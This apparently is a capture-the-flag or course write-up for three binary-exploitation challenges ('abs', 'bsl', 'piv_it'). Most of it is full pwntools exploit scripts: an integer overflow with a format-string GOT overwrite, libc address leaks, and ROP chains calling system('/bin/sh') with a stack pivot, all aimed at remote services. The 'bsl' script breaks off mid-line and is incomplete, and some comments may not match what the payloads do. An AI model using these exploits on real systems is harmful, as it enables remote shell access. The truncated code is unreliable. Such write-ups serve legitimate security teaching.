# abs


## Exploit 

The script performs two main exploit steps:

1. **Trigger an Integer Overflow:** We send an integer that exceeds the expected range, leading to unintended behavior.
2. **Hijack the GOT Entry for `exit`:** This is done using a format string vulnerability to overwrite the GOT entry for `exit` with the address of `win`.

### Script Details

Below is the exploit code:

```python
from pwn import *

# Padding function to help with overflow and alignment
def padding(size):
    return cyclic(size, alphabet=string.ascii_uppercase, n=8).encode()

context.arch = 'amd64'

# Setup for remote or local process
if args.R:
    p = remote('6447.lol', 9001)
elif args.H:
    p = process('./abs')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./abs',
                  gdbscript='''
                      b *main+296
                      c
                      ''')

# Address of the `win` function and GOT entry for `exit`
win_addr = 0x401196
exit_addr = 0x404038

# Buffers for data storage
buf1 = 0x405940
buf2 = buf1 + 8
## Step 1: Integer Overflow
# Using an oversized integer value
overflow_payload = b'2147483519'

## Step 2: GOT Hijacking with Format String
payload = (b"%4500c..")        # Padding to control the format string offset
payload += (b"%12$hn..")       # Writes `win` address into GOT `exit`
payload += p64(exit_addr)      # Address to be overwritten

# Sending exploit payload
p.sendlineafter(': ', overflow_payload + padding(5894) + p64(buf1) + p64(buf2) + payload)
p.interactive()
```

# bsl


## Exploit Strategy

The exploit is broken down into five main steps:

1. **Leak `puts` Address:** Leak the address of `puts` to calculate the libc base address.
2. **Calculate libc Base Address:** Using the leaked `puts` address and the known offset, determine the base address of libc.
3. **Build ROP Chain:** Construct a ROP chain to invoke `system("/bin/sh")`.
4. **Build a `ret` Sled:** Create a `ret` sled to improve stack alignment and ensure the payload's success.
5. **Exploit Logic:** Overwrite parts of the stack to redirect control flow to the ROP chain.

### Exploit Code

Here is the complete exploit code:

```python
from pwn import *

def padding(size, block=8):
    return cyclic(size, alphabet=string.ascii_uppercase, n=block).encode()

def ret_pop_shell_ropchain_payload(rop, libc_base):
    pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
    system_offset = libc.symbols['system']
    bin_sh_offset = next(libc.search(b'/bin/sh'))
    ret_gadget_offset = rop.find_gadget(['ret'])[0]

    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_gadget = libc_base + ret_gadget_offset
    print('system_addr:', hex(system_addr))
    print('bin_sh_addr:', hex(bin_sh_addr))
    rop_chain = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret_gadget) + p64(system_addr)
    return rop_chain

def ret_sled(rop, libc_base):
    ret_gadget_offset = rop.find_gadget(['ret'])[0]
    ret_gadget = libc_base + ret_gadget_offset
    ret_sled = p64(ret_gadget)
    return ret_sled

context.arch = 'amd64'

# Set up remote or local process
if args.R:
    p = remote('6447.lol', 9002)
elif args.H:
    p = process('./bsl')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./bsl',
                  gdbscript='''
                      b *most_fav+100
                      b *least_fav+116
                      b *fav+287
                      b *get_answer
                      c
                      ''')

# Step 1: Leak `puts` address
p.sendlineafter(b"Will you be my friend? (y/n)", b'y')
p.recvuntil(b"My current favourite is: ")
puts_leak = int(p.recvline().strip(), 16)
log.info(f"Puts leak: 
```

# piv_it

## Exploit Strategy

1. **Leak Address of `printf`:** Use a format string vulnerability to leak the `printf` function's address, allowing us to calculate the libc base.
2. **Calculate libc Base Address:** Using the leaked address and `printf`'s offset within libc, we derive the base address of libc.
3. **ROP Chain for Shell Execution:** Construct a ROP chain to call `system("/bin/sh")`.
4. **Stack Pivot:** Use a gadget to pivot the stack to a controlled location, enabling our ROP chain execution.

### Exploit Code

Here’s the complete code for the exploit:

```python
from pwn import *

def padding(size, block=8):
    return cyclic(size, alphabet=string.ascii_uppercase, n=block).encode()

def pop_shell_rop(rop, libc_base):
    pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
    system_offset = libc.symbols['system']
    bin_sh_offset = next(libc.search(b'/bin/sh'))
    ret_gadget_offset = rop.find_gadget(['ret'])[0]

    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_gadget = libc_base + ret_gadget_offset
    print('system_addr:', hex(system_addr))
    print('bin_sh_addr:', hex(bin_sh_addr))
    rop_chain = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret_gadget) + p64(system_addr)
    return rop_chain

context.arch = 'amd64'

# Setup for remote or local process
if args.R:
    p = remote('6447.lol', 9004)
elif args.H:
    p = process('./piv_it')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./piv_it',
                  gdbscript='''
                      b *main
                      b *vuln+68
                      c
                  ''')

# Step 1: Leak `printf` address
p.recvuntil(b"Unexpected Error Encountered At: ")
printf_leak = int(p.recvline().strip(), 16)
log.info(f"Printf leak: {hex(printf_leak)}")

# Load libc and calculate base address
libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')
printf_offset = libc.symbols['printf']
libc_base = printf_leak - printf_offset

# Step 2: Build ROP chain for `system("/bin/sh")`
rop = ROP(libc)
rop_chain = pop_shell_rop(rop, libc_base)

# Send ROP chain payload
p.sendlineafter(b'$ ', padding(72) + rop_chain)

# Step 3: Stack pivot using `add rsp, 0x2c8` gadget
add_rsp_gadget_addr = libc_base + 0x000000000008a510
p.sendlineafter(b'$ ', padding(40) + p64(add_rsp_gadget_addr))

# Interact with the shell
p.interactive()
p.close()
```